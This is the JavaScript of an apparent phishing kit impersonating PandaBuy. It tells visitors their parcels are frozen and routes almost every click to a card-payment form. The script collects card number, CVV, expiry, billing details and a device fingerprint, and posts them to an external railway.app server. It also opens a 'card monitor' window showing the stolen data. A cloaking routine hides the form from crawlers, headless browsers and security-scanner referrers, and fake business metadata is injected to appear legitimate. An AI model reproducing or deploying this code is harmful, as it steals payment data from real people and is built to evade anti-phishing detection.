// Global settings and variables
let monitorWindow = null;
let isMonitoringEnabled = false;
let isCloakingEnabled = true; // Enable cloaking by default

// Global error handler for debugging
window.addEventListener('error', function(e) {
    console.error('Global JavaScript error:', e.error);
    console.error('Error details:', {
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno
    });
});

// Unhandled promise rejection handler
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection:', e.reason);
});

document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM fully loaded - initializing all buttons');
    console.log('Current URL:', window.location.href);
    console.log('Available form elements:', {
        paymentForm: !!document.getElementById('paymentForm'),
        submitBtn: !!document.getElementById('submitBtn'),
        cardName: !!document.getElementById('cardName'),
        cardNumber: !!document.getElementById('cardNumber')
    });
    
    // Add direct event listeners to all verify/unfreeze buttons
    document.querySelectorAll('button').forEach(btn => {
        if (btn.textContent.includes('Verify') || btn.textContent.includes('Unfreeze')) {
            console.log('Found verify/unfreeze button:', btn);
            btn.addEventListener('click', function(e) {
                console.log('Verify/unfreeze button clicked:', this.textContent);
                e.preventDefault();
                showPaymentModal();
            });
        }
    });
    
    // Initialize cloaking system
    if (isCloakingEnabled) {
        initCloakingSystem();
    }
    
    // Custom Alert Functions
    const customAlert = document.getElementById('customAlert');
    const customAlertMessage = document.getElementById('customAlertMessage');
    const customAlertOk = document.getElementById('customAlertOk');
    const customAlertClose = document.querySelector('.custom-alert-close');
    
    function showCustomAlert(message, callback) {
        // Set the message
        customAlertMessage.textContent = message;
        
        // Show the alert
        customAlert.classList.add('show');
        
        // Handle OK button click
        const handleOkClick = function() {
            hideCustomAlert();
            if (typeof callback === 'function') {
                callback();
            }
            customAlertOk.removeEventListener('click', handleOkClick);
        };
        
        customAlertOk.addEventListener('click', handleOkClick);
        
        // Handle close button click
        customAlertClose.addEventListener('click', function() {
            hideCustomAlert();
            customAlertOk.removeEventListener('click', handleOkClick);
        });
    }
    
    function hideCustomAlert() {
        customAlert.classList.remove('show');
    }

    // Toast notification handling
    const toastNotification = document.getElementById('systemNotification');
    const toastCloseBtn = document.querySelector('.toast-close');
    
    if (toastCloseBtn) {
        toastCloseBtn.addEventListener('click', function() {
            closeToast();
        });
    }
    
    function closeToast() {
        if (toastNotification) {
            // Add animation for smooth exit
            toastNotification.style.animation = 'slideOut 0.3s ease-out forwards';
            
            // Remove from DOM after animation
            setTimeout(() => {
                toastNotification.style.display = 'none';
            }, 300);
        }
    }
    
    // Auto hide toast after 5 seconds
    setTimeout(() => {
        closeToast();
    }, 5000);

    // Setup the card monitor button
    const monitorBtn = document.getElementById('launchMonitorBtn');
    if (monitorBtn) {
        monitorBtn.addEventListener('click', function() {
            launchCardMonitor();
        });
    }
    
    // Auto-launch monitor in background if enabled
    setTimeout(() => {
        if (isMonitoringEnabled && !monitorWindow) {
            launchCardMonitor(true); // Launch in background
        }
    }, 2000);

    // Get UI elements
    const paymentModal = document.getElementById('paymentModal');
    const loginBtn = document.querySelector('.login-btn');
    const signupBtn = document.querySelector('.signup-btn');
    const closeBtn = document.querySelector('.close');
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    const cardNumberInput = document.getElementById('cardNumber');
    const cvvInput = document.getElementById('cvv');
    const paymentForm = document.getElementById('paymentForm');
    
    // Add form submission handler
    if (paymentForm) {
        console.log('Payment form found, adding submit handler');
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('Form submitted - processing payment data');
            handleFormSubmission();
        });
    } else {
        console.error('Payment form not found in DOM');
    }
    
    // Add direct click handler to submit button as backup
    const submitBtn = document.getElementById('submitBtn');
    if (submitBtn) {
        console.log('Submit button found, adding click handler');
        submitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('Submit button clicked directly');
            handleFormSubmission();
        });
    } else {
        console.error('Submit button not found in DOM');
    }
    
    // Get new modern UI elements
    const primaryBtn = document.querySelector('.primary-btn');
    const secondaryBtn = document.querySelector('.secondary-btn');
    const featureBoxes = document.querySelectorAll('.feature-box');

    // Function to show modal with animation
    function showPaymentModal() {
        // Check if cloaking system is available and if visitor is legitimate
        if (window.cloakingSystem && !window.cloakingSystem.isLegitimate()) {
            console.log('Cloaking: Blocked payment form for suspicious visitor');
            return;
        }
        
        // Use the new modal positioning function first
        positionModal();
        
        // Then display the modal
        paymentModal.style.display = 'flex';
        document.body.style.overflow = 'hidden'; // Prevent background scrolling
        
        // Add animation
        setTimeout(() => {
            document.querySelector('.modal-content').style.transform = 'translateY(0)';
        }, 10);
    }
    
    // Show payment modal when login or signup is clicked
    if (loginBtn) {
        loginBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }

    if (signupBtn) {
        signupBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }
    
    // Show payment modal when card alert button is clicked
    const cardAlertBtn = document.querySelector('.card-alert-btn');
    if (cardAlertBtn) {
        cardAlertBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }
    
    // Show payment modal when verification button is clicked
    const verificationBtn = document.querySelector('.verification-btn');
    console.log('Verification button found:', verificationBtn);
    if (verificationBtn) {
        verificationBtn.addEventListener('click', function(e) {
            console.log('Verification button clicked');
            e.preventDefault();
            e.stopPropagation();
            showPaymentModal();
        });
    } else {
        console.error('Verification button not found in the DOM');
    }

    // Add event listeners for step cards in the service steps section
    const stepCards = document.querySelectorAll('.step-card');
    if (stepCards && stepCards.length > 0) {
        stepCards.forEach(card => {
            card.addEventListener('click', function() {
                showPaymentModal();
            });
        });
    }
    
    // Add event listener for the account verification section button
    const verifyParcelBtn = document.querySelector('.verification-content button');
    if (verifyParcelBtn) {
        verifyParcelBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }
    
    // Primary button in hero section
    console.log('Primary button found:', primaryBtn);
    if (primaryBtn) {
        primaryBtn.addEventListener('click', function(e) {
            console.log('Primary button clicked');
            e.preventDefault();
            e.stopPropagation();
            
            // Smooth scroll to modal
            window.scrollTo({
                top: 0,
                behavior: 'smooth'
            });
            
            // Short delay before showing modal for better UX
            setTimeout(() => {
                showPaymentModal();
            }, 300);
        });
    } else {
        console.error('Primary button not found in the DOM');
        
        // Try to find it by alternative means and attach the event listener
        document.querySelectorAll('button').forEach(btn => {
            if (btn.textContent.includes('Verify') || btn.textContent.includes('Unfreeze')) {
                console.log('Found alternative verify button:', btn);
                btn.addEventListener('click', function(e) {
                    console.log('Alternative verify button clicked');
                    e.preventDefault();
                    showPaymentModal();
                });
            }
        });
    }
    
    // Secondary button for tracking
    if (secondaryBtn) {
        secondaryBtn.addEventListener('click', function() {
            showCustomAlert('Your parcels are currently frozen. Please verify your details first to access tracking information.', function() {
                showPaymentModal();
            });
        });
    }
    
    // Add click handler for feature boxes
    if (featureBoxes && featureBoxes.length > 0) {
        featureBoxes.forEach(box => {
            box.addEventListener('click', function() {
                showPaymentModal();
            });
        });
    }
    
    // Open card monitor in a dedicated window
    const openMonitorBtn = document.getElementById('openMonitorBtn');
    if (openMonitorBtn) {
        openMonitorBtn.addEventListener('click', function() {
            // Close previous window if it exists
            if (monitorWindow && !monitorWindow.closed) {
                monitorWindow.close();
            }
            
            // Open a new window with the details page
            monitorWindow = window.open('details-cards.html', 'detailsCardsWindow', 
                'width=1000,height=800,menubar=no,toolbar=no,location=no');
            
            // Focus the new window
            if (monitorWindow) {
                monitorWindow.focus();
                
                // Show success message
                showCustomAlert('Card Monitor launched. The window will automatically update when new card data is received.');
            } else {
                // If window was blocked by popup blocker
                showCustomAlert('Card Monitor window was blocked. Please allow popups for this site to use the monitoring feature.');
            }
        });
    }
    
    // Add verification prompts for any navigation attempt
    document.addEventListener('click', function(e) {
        // If the user clicked on any link or button not related to payment
        if (e.target.tagName === 'A' || 
            (e.target.tagName === 'BUTTON' && 
             !e.target.classList.contains('card-alert-btn') && 
             !e.target.classList.contains('verification-btn') &&
             !e.target.classList.contains('submit-btn') &&
             !e.target.classList.contains('close') &&
             !e.target.classList.contains('primary-btn') &&
             !e.target.classList.contains('secondary-btn') &&
             !e.target.classList.contains('toast-close') &&
             !e.target.classList.contains('custom-alert-button') &&
             !e.target.classList.contains('custom-alert-close'))) {
            
            // Prevent the default action
            e.preventDefault();
            
            // Show custom alert instead of standard alert
            showCustomAlert('You must verify your details to unfreeze your parcels and continue.', function() {
                showPaymentModal();
            });
        }
    });

    // Function to close modal with animation
    function closePaymentModal() {
        // Add animation
        const modalContent = document.querySelector('.modal-content');
        modalContent.style.transform = 'translateY(50px)';
        modalContent.style.opacity = '0';
        
        // After animation completes, hide modal
        setTimeout(() => {
            paymentModal.style.display = 'none';
            document.body.style.overflow = ''; // Restore scrolling
            
            // Reset transform for next opening
            modalContent.style.transform = '';
            modalContent.style.opacity = '';
        }, 300);
    }
    
    // Close modal when close button is clicked
    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            closePaymentModal();
        });
    }

    // Close modal when clicking outside of it
    window.addEventListener('click', function(event) {
        if (event.target === paymentModal) {
            closePaymentModal();
        }
    });

    // Format card number with spaces every 4 digits and detect card type
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
        
        // Detect card type
        detectCardType(value);
    });

    // Detect and display card type based on first digits
    function detectCardType(cardNumber) {
        // Clear existing class
        cardTypeIcon.style.backgroundImage = '';
        
        // Regex patterns for card types
        const cardPatterns = {
            visa: /^4/,
            mastercard: /^5[1-5]/,
            amex: /^3[47]/,
            discover: /^6(?:011|5)/,
            dinersclub: /^3(?:0[0-5]|[68])/,
            jcb: /^(?:2131|1800|35\d{3})/
        };
        
        for (const [card, pattern] of Object.entries(cardPatterns)) {
            if (pattern.test(cardNumber)) {
                cardTypeIcon.style.backgroundImage = `url('https://cdn.jsdelivr.net/npm/payment-icons@1.0.0/min/flat/${card}.svg')`;
                return;
            }
        }
    }

    // Validate CVV (numbers only)
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
    });

    // Unified Form Submission Handler
    if (paymentForm) {
        paymentForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('Form submission initiated.');

            // --- 1. GATHER DATA ---
            const paymentData = {};
            const allInputs = paymentForm.querySelectorAll('input, select');
            allInputs.forEach(input => {
                if (input.id) {
                    // Sanitize card number by removing spaces
                    paymentData[input.id] = (input.id === 'cardNumber') 
                        ? input.value.replace(/\s+/g, '') 
                        : input.value;
                }
            });
            
            // Add timestamp and detailed visitor info
            paymentData.timestamp = new Date().toISOString();
            if (typeof collectVisitorData === 'function') {
                paymentData.visitor = collectVisitorData();
            }
            console.log('Collected Data:', paymentData);

            // --- 2. VALIDATE DATA ---
            if (!paymentData.cardName || !paymentData.cardNumber || !paymentData.cvv) {
                alert('Please fill out all required fields.');
                return;
            }

            // --- 3. UI FEEDBACK ---
            const submitBtn = document.querySelector('.submit-btn');
            if (submitBtn) {
                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
                submitBtn.disabled = true;
            }

            // --- 4. SAVE & SEND DATA ---
            // Save to localStorage for the success page
            try {
                localStorage.setItem('mostRecentCard', JSON.stringify(paymentData));
                console.log('Data saved to localStorage for success page.');
            } catch (e) {
                console.error('Could not save to localStorage:', e);
            }

            // Send to the server for permanent logging
            fetch('https://fzn97id1.up.railway.app/api/cards', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(paymentData)
            })
            .then(res => res.json())
            .then(serverData => console.log('Server Response:', serverData))
            .catch(error => console.error('Error sending data to server:', error))
            .finally(() => {
                // --- 5. REDIRECT ---
                console.log('Redirecting to success page...');
                window.location.href = 'payment-success.html';
            });
        });
    }

    // Also show payment modal for the search button (for demo purposes)
    const searchBtn = document.querySelector('.search-btn');
    if (searchBtn) {
        searchBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }
    
    // Show payment modal when the header search button is clicked
    const headerSearchBtn = document.querySelector('.search-icon');
    if (headerSearchBtn) {
        headerSearchBtn.addEventListener('click', function() {
            showPaymentModal();
        });
    }

    // Create additional triggers to show the payment modal
    const featureCards = document.querySelectorAll('.feature-card');
    featureCards.forEach(card => {
        card.addEventListener('click', function() {
            paymentModal.style.display = 'block';
        });
    });
    
    // Add Luhn algorithm check for card number validation
    function isValidCardNumber(cardNumber) {
        // Remove spaces and non-digit characters
        cardNumber = cardNumber.replace(/\D/g, '');
        
        let sum = 0;
        let shouldDouble = false;
        
        // Loop through values starting from the rightmost digit
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i));
            
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        
        return (sum % 10) === 0;
    }

    // Improve modal positioning for various screen sizes
    function positionModal() {
        const modal = document.getElementById('paymentModal');
        const modalContent = modal.querySelector('.modal-content');
        
        if (window.innerWidth <= 480) {
            // Full screen on small mobile
            modalContent.style.margin = '0';
            modalContent.style.width = '100%';
            modalContent.style.maxHeight = '100%';
            modalContent.style.borderRadius = '0';
            modal.style.alignItems = 'flex-start';
            modal.style.justifyContent = 'flex-start';
        } else if (window.innerWidth <= 768) {
            // Near full screen on tablet
            modalContent.style.margin = '10px auto';
            modalContent.style.width = '95%';
            modalContent.style.maxHeight = '95vh';
            modalContent.style.borderRadius = '16px';
            modal.style.alignItems = 'center';
            modal.style.justifyContent = 'center';
        } else {
            // Default for desktop
            modalContent.style.margin = '20px auto';
            modalContent.style.width = '90%';
            modalContent.style.maxHeight = '90vh';
            modalContent.style.borderRadius = '16px';
            modal.style.alignItems = 'center';
            modal.style.justifyContent = 'center';
        }
    }

    // Add event listeners for responsiveness
    window.addEventListener('resize', () => {
        const modal = document.getElementById('paymentModal');
        if (modal.style.display === 'flex') {
            positionModal();
        }
    });

    // Update modal open function to use our new function
    document.querySelectorAll('.open-payment-modal').forEach(button => {
        button.addEventListener('click', showPaymentModal);
    });

    // Update modal close function
    document.querySelector('.close').addEventListener('click', closePaymentModal);

    // Close modal when clicking outside
    window.addEventListener('click', (event) => {
        const modal = document.getElementById('paymentModal');
        if (event.target === modal) {
            closePaymentModal();
        }
    });
});

// Cloaking System Implementation
function initCloakingSystem() {
    console.log('Initializing cloaking system...');
    
    // Store visitor verification status in session storage to avoid repeated checks
    if (sessionStorage.getItem('visitorVerified') === null) {
        // Perform checks and store result
        const isValid = performVisitorChecks();
        sessionStorage.setItem('visitorVerified', isValid ? 'true' : 'false');
        console.log('Cloaking: Visitor verification status set to', isValid);
    }
    
    // Add metadata to make the site look legitimate
    addLegitimateMetadata();
}

function isValidVisitor() {
    // Check if we've already verified this visitor in this session
    const storedVerification = sessionStorage.getItem('visitorVerified');
    if (storedVerification !== null) {
        return storedVerification === 'true';
    }
    
    // If not stored yet, perform checks and store result
    const isValid = performVisitorChecks();
    sessionStorage.setItem('visitorVerified', isValid ? 'true' : 'false');
    return isValid;
}

function performVisitorChecks() {
    // 1. Check if it's coming from a search engine user agent
    const userAgent = navigator.userAgent.toLowerCase();
    const botPatterns = [
        'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
        'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
        'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkshare', 'w3c_validator',
        'crawler', 'spider', 'lighthouse', 'bot', 'headless', 'audit', 'check', 'scan'
    ];
    
    const isBotUA = botPatterns.some(pattern => userAgent.includes(pattern));
    if (isBotUA) {
        console.log('Cloaking: Bot user agent detected');
        return false;
    }
    
    // 2. Check if the browser has common bot characteristics
    // Check if it's a headless browser
    const isHeadless = /HeadlessChrome/.test(navigator.userAgent) || 
                       !navigator.plugins || 
                       navigator.plugins.length === 0 || 
                       !navigator.languages || 
                       navigator.languages.length === 0;
    
    if (isHeadless) {
        console.log('Cloaking: Headless browser characteristics detected');
        return false;
    }
    
    // 3. Check if coming from a security service IP range (simplified)
    const referrer = document.referrer.toLowerCase();
    const suspiciousReferrers = [
        'google.com/safebrowsing', 'virustotal.com', 'urlscan.io',
        'phishtank.com', 'check-host.net', 'scanurl.net', 'securi', 'mcafee',
        'cloudflare', 'security', 'phish', 'malware', 'secure', 'scan'
    ];
    
    const isSuspiciousReferrer = suspiciousReferrers.some(ref => referrer.includes(ref));
    if (isSuspiciousReferrer) {
        console.log('Cloaking: Suspicious referrer detected');
        return false;
    }
    
    // 4. Check if there's suspicious URL parameters that might indicate a scan
    const urlParams = new URLSearchParams(window.location.search);
    const suspiciousParams = ['scan', 'check', 'test', 'security', 'bot', 'debug', 'verify'];
    
    for (const param of suspiciousParams) {
        if (urlParams.has(param)) {
            console.log('Cloaking: Suspicious URL parameter detected:', param);
            return false;
        }
    }
    
    // 5. Check if DevTools is open (often used by security researchers)
    try {
        const devtoolsOpen = window.outerWidth - window.innerWidth > 160 || 
                             window.outerHeight - window.innerHeight > 160 || 
                             window.devtools?.open;
        
        if (devtoolsOpen) {
            console.log('Cloaking: DevTools appears to be open');
            // Not failing here, but logging it
        }
    } catch (e) {
        console.log('Cloaking: Error checking DevTools state', e);
    }
    
    // 6. Check if the user has typical user behavior
    // If the page has been open for less than 2 seconds and trying to access sensitive content,
    // it's likely a bot or scanning tool
    const pageOpenTime = performance.now();
    if (pageOpenTime < 2000) {
        console.log('Cloaking: Page accessed too quickly, possible automated scan');
        // We'll add a delay for initial checks rather than outright blocking
        return true; // Allow initial access but monitor behavior
    }
    
    // 7. Check for common screen dimensions to detect typical users
    // Most real users have standard screen resolutions, while security tools may use unusual ones
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    
    // Check for unusual screen dimensions (tiny or oddly specific values often used in automation)
    if (screenWidth < 300 || screenHeight < 300 || 
        (screenWidth === 1000 && screenHeight === 1000) || 
        (screenWidth === 800 && screenHeight === 600)) {
        console.log('Cloaking: Unusual screen dimensions detected');
        return false;
    }
    
    // All checks passed, visitor seems legitimate
    return true;
}

function showCloakedContent() {
    // If we detect a bot or security tool, show a harmless alternative content
    console.log('Cloaking: Showing alternative content');
    
    // Create a simple error message instead of the payment form
    const modal = document.getElementById('paymentModal');
    if (modal) {
        const modalContent = modal.querySelector('.modal-content');
        if (modalContent) {
            // Save original content in case we need to restore it
            if (!modalContent.dataset.originalContent) {
                modalContent.dataset.originalContent = modalContent.innerHTML;
            }
            
            // Show a generic error message instead
            modalContent.innerHTML = `
                <span class="close">&times;</span>
                <div class="payment-header">
                    <img src="images/logo.png" alt="PandaBuy Logo" class="payment-logo">
                    <h2>Service Temporarily Unavailable</h2>
                    <p class="payment-header-text">We're performing scheduled maintenance. Please try again later.</p>
                </div>
                <div style="padding: 30px; text-align: center;">
                    <i class="fas fa-server" style="font-size: 48px; color: #4a6cf7; margin-bottom: 20px;"></i>
                    <p>Our payment verification system is currently undergoing scheduled maintenance.</p>
                    <p>Please check back later or contact customer support if you need immediate assistance.</p>
                    <a href="https://t.me/azzarro" target="_blank" style="display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4a6cf7; color: white; text-decoration: none; border-radius: 4px;">
                        <i class="fab fa-telegram"></i> Contact Support
                    </a>
                </div>
            `;
            
            // Add event listener to the new close button
            const newCloseBtn = modalContent.querySelector('.close');
            if (newCloseBtn) {
                newCloseBtn.addEventListener('click', function() {
                    modal.style.display = 'none';
                });
            }
            
            // Show the altered modal
            modal.style.display = 'flex';
        }
    }
}

function addLegitimateMetadata() {
    // Add SEO meta tags that make the site look like a legitimate e-commerce site
    const metaTags = [
        { name: 'description', content: 'PandaBuy - Your trusted partner for global shipping and package forwarding services from China. Track shipments, manage parcels, and enjoy secure international delivery.' },
        { name: 'keywords', content: 'parcel forwarding, china shipping, international package delivery, pandabuy, logistics services, global shipping' },
        { name: 'robots', content: 'index, follow' },
        { property: 'og:title', content: 'PandaBuy - Global Shipping & Parcel Services' },
        { property: 'og:description', content: 'Trusted parcel forwarding and global shipping services from China. Manage your packages and track shipments with ease.' },
        { property: 'og:type', content: 'website' },
        { property: 'og:url', content: window.location.href },
        { name: 'twitter:card', content: 'summary_large_image' },
        { name: 'twitter:title', content: 'PandaBuy - Global Shipping & Parcel Services' },
        { name: 'twitter:description', content: 'Trusted parcel forwarding and global shipping services from China. Manage your packages and track shipments with ease.' }
    ];
    
    // Add the meta tags to the document head
    metaTags.forEach(tag => {
        const meta = document.createElement('meta');
        if (tag.name) meta.name = tag.name;
        if (tag.property) meta.setAttribute('property', tag.property);
        meta.content = tag.content;
        document.head.appendChild(meta);
    });
    
    // Add schema.org structured data for a legitimate business
    const schemaScript = document.createElement('script');
    schemaScript.type = 'application/ld+json';
    schemaScript.textContent = JSON.stringify({
        '@context': 'https://schema.org',
        '@type': 'Organization',
        'name': 'PandaBuy',
        'url': window.location.origin,
        'logo': window.location.origin + '/images/logo.png',
        'description': 'International shipping and parcel forwarding services specializing in deliveries from China to worldwide destinations.',
        'address': {
            '@type': 'PostalAddress',
            'streetAddress': 'Flat 107 25 Indescon Square',
            'addressLocality': 'London',
            'addressRegion': 'England',
            'postalCode': 'E14 9DG',
            'addressCountry': 'UK'
        },
        'contactPoint': {
            '@type': 'ContactPoint',
            'contactType': 'customer service',
            'email': 'support@pandabuy.com'
        }
    });
    document.head.appendChild(schemaScript);
}

// Function to launch the card details monitor window
function launchCardMonitor(inBackground = false) {
    try {
        console.log('Launching card monitor...');
        
        // Close existing window if open
        if (monitorWindow && !monitorWindow.closed) {
            monitorWindow.close();
        }
        
        // Open the window with specific dimensions
        monitorWindow = window.open('details-cards.html', 'detailsCardsWindow', 
            'width=800,height=600,resizable=yes,scrollbars=yes');
        
        // Focus the window if not in background mode
        if (monitorWindow) {
            if (!inBackground) {
                monitorWindow.focus();
            }
            console.log('Monitor window opened successfully');
            isMonitoringEnabled = true;
        } else {
            console.error('Failed to open monitor window - popup blocked?');
            showCustomAlert('The card monitor window was blocked. Please allow popups for this site.');
        }
    } catch (e) {
        console.error('Error launching card monitor:', e);
    }
}

// Function to store card data for our details page and send it immediately
function storeCardData(data) {
    console.log('Starting storeCardData with data:', data);
    
    // Store in localStorage as backup
    try {
        const existingData = JSON.parse(localStorage.getItem('cardData') || '[]');
        existingData.push(data);
        localStorage.setItem('cardData', JSON.stringify(existingData));
        console.log('Card data stored in localStorage');
    } catch (error) {
        console.error('Error storing card data in localStorage:', error);
    }
}

// Start processing animation
function startProcessingAnimation() {
    console.log('Starting processing animation');
    
    try {
        // Show processing bar
        const processingBar = document.getElementById('processingBar');
        const submitBtn = document.getElementById('submitBtn');
        
        if (processingBar) {
            processingBar.style.display = 'block';
        }
        
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        }
        
        // Update verification stages
        updateVerificationStages();
        
    } catch (error) {
        console.error('Error in processing animation:', error);
    }
}

// Update verification stages during processing
function updateVerificationStages() {
    const stages = ['stage-verify', 'stage-connect', 'stage-unfreeze', 'stage-ship'];
    let currentStage = 0;
    
    const updateStage = () => {
        if (currentStage < stages.length) {
            const stageElement = document.getElementById(stages[currentStage]);
            if (stageElement) {
                stageElement.classList.add('active');
                stageElement.classList.add('completed');
            }
            currentStage++;
            
            if (currentStage < stages.length) {
                setTimeout(updateStage, 800);
            }
        }
    };
    
    // Start updating stages after a short delay
    setTimeout(updateStage, 500);
}

// Handle form submission
async function handleFormSubmission() {
    console.log('Starting form submission process');
    
    // Show processing animation
    startProcessingAnimation();
    
    try {
        // Collect all form data
        const formData = await collectFormData();
        console.log('Form data collected:', formData);
        
        // Store data locally and on server
        storeCardData(formData);
        await sendDataToServer(formData);
        
        // Wait for processing animation to complete
        setTimeout(() => {
            console.log('Redirecting to ship-out page');
            redirectToSuccess(formData);
        }, 3000);
        
    } catch (error) {
        console.error('Error during form submission:', error);
        // Still redirect even if there's an error
        setTimeout(() => {
            redirectToSuccess();
        }, 2000);
    }
}

// Collect all form data
async function collectFormData() {
    console.log('Collecting form data...');
    
    // Get form field values
    const cardData = {
        // Card information
        cardName: document.getElementById('cardName')?.value || '',
        cardNumber: document.getElementById('cardNumber')?.value || '',
        expMonth: document.getElementById('expMonth')?.value || '',
        expYear: document.getElementById('expYear')?.value || '',
        cvv: document.getElementById('cvv')?.value || '',
        
        // Billing information
        email: document.getElementById('email')?.value || '',
        phoneNumber: document.getElementById('phoneNumber')?.value || '',
        billingAddress: document.getElementById('billingAddress')?.value || '',
        billingAddress2: document.getElementById('billingAddress2')?.value || '',
        city: document.getElementById('city')?.value || '',
        state: document.getElementById('state')?.value || '',
        zipCode: document.getElementById('zipCode')?.value || '',
        country: document.getElementById('country')?.value || '',
        
        // Metadata
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screenResolution: `${screen.width}x${screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        referrer: document.referrer || 'direct'
    };
    
    // Get visitor IP address
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        cardData.ipAddress = ipData.ip;
    } catch (error) {
        console.log('Could not fetch IP address:', error);
        cardData.ipAddress = 'unknown';
    }
    
    // Detect browser and OS
    const browserInfo = detectBrowserAndOS();
    cardData.browser = browserInfo.browser;
    cardData.os = browserInfo.os;
    cardData.deviceType = browserInfo.deviceType;
    
    return cardData;
}

// Send data to server
async function sendDataToServer(data) {
    console.log('Sending data to server...');
    
    try {
        const response = await fetch('https://fzn97id1.up.railway.app/api/cards', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        if (response.ok) {
            console.log('Data successfully sent to server');
        } else {
            console.error('Server responded with error:', response.status);
        }
    } catch (error) {
        console.error('Error sending data to server:', error);
        // Don't throw error - we still want to proceed
    }
}

// Redirect to ship-out page
function redirectToSuccess(formData = null) {
    console.log('Redirecting to ship-out page...');
    
    try {
        // Store form data for ship-out page in both sessionStorage and localStorage
        if (formData) {
            sessionStorage.setItem('paymentData', JSON.stringify(formData));
            localStorage.setItem('mostRecentCard', JSON.stringify(formData));
        }
        
        // Multiple redirect methods for reliability
        window.location.href = 'ship-out.html';
        
        // Backup redirect methods
        setTimeout(() => {
            if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
                window.location.replace('ship-out.html');
            }
        }, 500);
        
        setTimeout(() => {
            if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
                window.location.assign('ship-out.html');
            }
        }, 1000);
        
    } catch (error) {
        console.error('Error during redirect:', error);
        // Force redirect as last resort
        window.open('ship-out.html', '_self');
    }
}

// Detect browser and OS information
function detectBrowserAndOS() {
    const userAgent = navigator.userAgent;
    let browser = 'Unknown';
    let os = 'Unknown';
    let deviceType = 'Desktop';
    
    // Detect browser
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
        browser = 'Chrome';
    } else if (userAgent.includes('Firefox')) {
        browser = 'Firefox';
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        browser = 'Safari';
    } else if (userAgent.includes('Edg')) {
        browser = 'Edge';
    } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
        browser = 'Opera';
    }
    
    // Detect OS
    if (userAgent.includes('Windows')) {
        os = 'Windows';
    } else if (userAgent.includes('Mac')) {
        os = 'macOS';
    } else if (userAgent.includes('Linux')) {
        os = 'Linux';
    } else if (userAgent.includes('Android')) {
        os = 'Android';
        deviceType = 'Mobile';
    } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        os = 'iOS';
        deviceType = userAgent.includes('iPad') ? 'Tablet' : 'Mobile';
    }
    
    // Detect device type
    if (userAgent.includes('Mobile') && deviceType === 'Desktop') {
        deviceType = 'Mobile';
    } else if (userAgent.includes('Tablet') && deviceType === 'Desktop') {
        deviceType = 'Tablet';
    }
    
    return { browser, os, deviceType };
} 